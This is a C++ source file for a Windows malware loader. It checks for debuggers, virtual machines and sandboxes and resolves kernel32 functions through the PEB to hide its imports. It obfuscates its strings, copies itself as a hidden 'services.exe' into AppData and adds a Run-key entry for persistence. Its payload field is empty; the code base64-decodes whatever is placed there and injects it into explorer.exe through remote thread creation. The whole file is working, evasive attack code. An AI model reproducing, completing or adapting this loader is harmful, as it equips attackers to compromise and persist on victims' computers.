#undef UNICODE
#undef _UNICODE
#include <iostream>
#include <string>
#include <vector>
#include <winsock2.h>
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <cwchar>
#include <iphlpapi.h>
#include "obf.h"
#include "anti_debug.h"
#include "anti_sandbox.h"
#include "anti_vm.h"
#pragma comment(lib, "iphlpapi.lib")
#include <tchar.h>
#include <psapi.h>
#include <aclapi.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <vector>
#include <map>
#include <thread>
#include <mutex>
#include <chrono>

#define ENABLE_STARTUP_PERSISTENCE 1

typedef HMODULE(WINAPI* pGetModuleHandleA)(LPCSTR);
typedef FARPROC(WINAPI* pGetProcAddress)(HMODULE, LPCSTR);
typedef HANDLE(WINAPI* pCreateToolhelp32Snapshot)(DWORD, DWORD);
typedef BOOL(WINAPI* pProcess32First)(HANDLE, LPPROCESSENTRY32);
typedef BOOL(WINAPI* pProcess32Next)(HANDLE, LPPROCESSENTRY32);
typedef HANDLE(WINAPI* pOpenProcess)(DWORD, BOOL, DWORD);
typedef LPVOID(WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef HANDLE(WINAPI* pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* pCloseHandle)(HANDLE);
typedef BOOL(WINAPI* pVirtualFreeEx)(HANDLE, LPVOID, SIZE_T, DWORD);

pCreateToolhelp32Snapshot CreateToolhelp32Snapshot_ptr = nullptr;
pProcess32First Process32First_ptr = nullptr;
pProcess32Next Process32Next_ptr = nullptr;
pOpenProcess OpenProcess_ptr = nullptr;
pVirtualAllocEx VirtualAllocEx_ptr = nullptr;
pWriteProcessMemory WriteProcessMemory_ptr = nullptr;
pCreateRemoteThread CreateRemoteThread_ptr = nullptr;
pCloseHandle CloseHandle_ptr = nullptr;
pVirtualFreeEx VirtualFreeEx_ptr = nullptr;

int my_stricmp(const char* s1, const char* s2) {
    while (*s1 && (tolower(*s1) == tolower(*s2))) {
        s1++;
        s2++;
    }
    return *(const unsigned char*)s1 - *(const unsigned char*)s2;
}

HMODULE get_module_handle_manual(const wchar_t* module_name) {
    PEB* peb = (PEB*)__readgsqword(0x60);
    PEB_LDR_DATA* ldr = peb->Ldr;
    LIST_ENTRY* head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY* curr = head->Flink;

    while (curr != head) {
        LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (entry->FullDllName.Buffer != nullptr) {
            const wchar_t* full_name = entry->FullDllName.Buffer;
            const wchar_t* base_name = wcsrchr(full_name, L'\\');
            if (base_name == nullptr) {
                base_name = full_name;
            } else {
                base_name++; // Move past the backslash
            }
            if (_wcsicmp(base_name, module_name) == 0) {
                return (HMODULE)entry->DllBase;
            }
        }
        curr = curr->Flink;
    }
    return NULL;
}

FARPROC get_proc_address_manual(HMODULE h_mod, const char* func_name) {
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)h_mod;
    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((BYTE*)h_mod + dos_header->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY export_dir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)h_mod + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD addr_of_funcs = (PDWORD)((BYTE*)h_mod + export_dir->AddressOfFunctions);
    PDWORD addr_of_names = (PDWORD)((BYTE*)h_mod + export_dir->AddressOfNames);
    PWORD addr_of_name_ordinals = (PWORD)((BYTE*)h_mod + export_dir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < export_dir->NumberOfNames; i++) {
        if (my_stricmp(func_name, (const char*)h_mod + addr_of_names[i]) == 0) {
            return (FARPROC)((BYTE*)h_mod + addr_of_funcs[addr_of_name_ordinals[i]]);
        }
    }

    return NULL;
}
std::string base64_decode(std::string const& encoded_string) {
    std::string base64_chars =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz"
        "0123456789+/";
    std::string decoded;
    std::vector<int> T(256, -1);
    for (int i = 0; i < 64; i++) T[base64_chars[i]] = i;

    int val = 0, valb = -8;
    for (char c : encoded_string) {
        if (T[c] == -1) break;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            decoded.push_back(char((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return decoded;
}
DWORD get_proc_id(const char* proc_name) {
    DWORD proc_id = 0;
    HANDLE h_snap = CreateToolhelp32Snapshot_ptr(TH32CS_SNAPPROCESS, 0);
    if (h_snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 proc_entry;
        proc_entry.dwSize = sizeof(proc_entry);
        if (Process32First_ptr(h_snap, &proc_entry)) {
            do {
                if (!my_stricmp(proc_entry.szExeFile, proc_name)) {
                    proc_id = proc_entry.th32ProcessID;
                    break;
                }
            } while (Process32Next_ptr(h_snap, &proc_entry));
        }
    }
    CloseHandle_ptr(h_snap);
    return proc_id;
}

bool RegisterSystemTask(const std::string& executablePath) {
    HKEY hKey;
    std::string runKeyStr = OBF_STR("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    std::string valueNameStr = OBF_STR("SystemCoreService");

    LONG openRes = RegOpenKeyExA(HKEY_CURRENT_USER, runKeyStr.c_str(), 0, KEY_WRITE, &hKey);
    if (openRes != ERROR_SUCCESS) {
        return false;
    }

    LONG setRes = RegSetValueExA(hKey, valueNameStr.c_str(), 0, REG_SZ, (const BYTE*)executablePath.c_str(), executablePath.length() + 1);
    if (setRes != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return false;
    }

    RegCloseKey(hKey);
    return true;
}

enum RelocateResult {
    RELOCATE_SUCCESS,
    RELOCATE_ALREADY_EXISTS,
    RELOCATE_FAILED
};

RelocateResult RelocateModule(std::string& newPath) {
    char currentPath[MAX_PATH];
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);

    const char* appDataPath = getenv(OBF_STR("APPDATA").c_str());
    if (appDataPath == NULL) {
        return RELOCATE_FAILED;
    }

    newPath = std::string(appDataPath) + OBF_STR("\\services.exe");

    if (!CopyFileA(currentPath, newPath.c_str(), TRUE)) { // TRUE = bFailIfExists
        DWORD error = GetLastError();
        if (error == ERROR_FILE_EXISTS) {
            return RELOCATE_ALREADY_EXISTS;
        } else {
            return RELOCATE_FAILED;
        }
    }

    SetFileAttributesA(newPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
    return RELOCATE_SUCCESS;
}

int main() {
	if (CheckForDebugger() || AntiVM::isVM() || AntiSandbox::check_cpuid() || AntiSandbox::check_timing() || AntiSandbox::check_ram() || AntiSandbox::check_mac_address() || AntiSandbox::check_hardware_names() || AntiSandbox::check_linux_artifacts() || AntiSandbox::check_registry_keys() || AntiSandbox::check_vm_files() || AntiSandbox::check_running_processes()) {
        return 1;
    }

#if ENABLE_STARTUP_PERSISTENCE
    std::string newPath;
    RelocateResult relocateResult = RelocateModule(newPath);

    if (relocateResult == RELOCATE_SUCCESS) {
        if (!RegisterSystemTask(newPath)) {
            // Persistence failed, but payload delivered.
        }
    }
#endif

    HMODULE h_kernel32;
    std::string encoded_shellcode;
    std::string decoded_shellcode;
    DWORD proc_id;
    HANDLE h_proc;
    LPVOID remote_mem;
    HANDLE h_thread;

    std::string kernel32_dll_str = OBF_STR("kernel32.dll");
    std::wstring kernel32_dll_wstr(kernel32_dll_str.begin(), kernel32_dll_str.end());

    h_kernel32 = get_module_handle_manual(kernel32_dll_wstr.c_str());
    CreateToolhelp32Snapshot_ptr = (pCreateToolhelp32Snapshot)get_proc_address_manual(h_kernel32, OBF_STR("CreateToolhelp32Snapshot").c_str());
    Process32First_ptr = (pProcess32First)get_proc_address_manual(h_kernel32, OBF_STR("Process32First").c_str());
    Process32Next_ptr = (pProcess32Next)get_proc_address_manual(h_kernel32, OBF_STR("Process32Next").c_str());
    OpenProcess_ptr = (pOpenProcess)get_proc_address_manual(h_kernel32, OBF_STR("OpenProcess").c_str());
    VirtualAllocEx_ptr = (pVirtualAllocEx)get_proc_address_manual(h_kernel32, OBF_STR("VirtualAllocEx").c_str());
    WriteProcessMemory_ptr = (pWriteProcessMemory)get_proc_address_manual(h_kernel32, OBF_STR("WriteProcessMemory").c_str());
    CreateRemoteThread_ptr = (pCreateRemoteThread)get_proc_address_manual(h_kernel32, OBF_STR("CreateRemoteThread").c_str());
    CloseHandle_ptr = (pCloseHandle)get_proc_address_manual(h_kernel32, OBF_STR("CloseHandle").c_str());
    VirtualFreeEx_ptr = (pVirtualFreeEx)get_proc_address_manual(h_kernel32, OBF_STR("VirtualFreeEx").c_str());

    std::string en_sh = OBF_STR("");

    std::string dshell = base64_decode(en_sh);
    proc_id = get_proc_id(OBF_STR("explorer.exe").c_str());
    if (proc_id == 0) {
        return 1;
    }
    h_proc = OpenProcess_ptr(PROCESS_ALL_ACCESS, FALSE, proc_id);
    if (h_proc == NULL) {
        return 1;
    }

    remote_mem = VirtualAllocEx_ptr(h_proc, NULL, dshell.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remote_mem == NULL) {
        CloseHandle_ptr(h_proc);
        return 1;
    }

    if (!WriteProcessMemory_ptr(h_proc, remote_mem, dshell.c_str(), dshell.size(), NULL)) {
        VirtualFreeEx_ptr(h_proc, remote_mem, 0, MEM_RELEASE);
        CloseHandle_ptr(h_proc);
        return 1;
    }

    h_thread = CreateRemoteThread_ptr(h_proc, NULL, 0, (LPTHREAD_START_ROUTINE)remote_mem, NULL, 0, NULL);
    if (h_thread == NULL) {
        VirtualFreeEx_ptr(h_proc, remote_mem, 0, MEM_RELEASE);
        CloseHandle_ptr(h_proc);
        return 1;
    }
    CloseHandle_ptr(h_thread);
    CloseHandle_ptr(h_proc);

    return 0;
}